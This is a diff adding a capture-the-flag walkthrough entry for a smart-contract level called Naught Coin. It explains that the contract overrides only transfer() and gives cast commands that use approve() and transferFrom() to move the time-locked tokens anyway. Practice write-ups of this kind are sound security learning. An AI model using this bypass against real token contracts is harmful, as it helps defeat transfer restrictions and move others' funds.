@@ -547,3 +547,23 @@ forge create src/level14.sol:AttackGatekeeperTwo --constructor-args $LEVEL_ADDRE
 6. as the function is called inside constructor we don't need to make any other function call.
 
 7. submit the instance, u're done.
+
+## level15 - Naught Coin
+
+1. Naught Coin contract is inheriting functions from the ERC20 contract which means transfer() function is not the only way to move tokens around.
+
+2. In ERC20 contract there are two ways to move tokens transfer() and transferFrom() , naught coin is overriding only the transfer() function , means we can still use transferFrom()
+
+3. so we first need to approve spender to spend our tokens
+
+```
+cast send $LEVEL_ADDRESS "approve(address spender, uint256 amount)" $SPENDER_ADDRESS 1000000000000000000000000 --rpc-url $RPC_URL --private-key $PKEY
+```
+
+4. now we can use transferFrom()
+
+```
+cast send $LEVEL_ADDRESS "transferFrom(address from, address to, uint256 amount)" $PLAYER_ADDRESS $SPENDER_ADDRESS 1000000000000000000000000 --rpc-url $RPC_URL --private-key $PKEY
+```
+
+5. submit the instance, u're done.
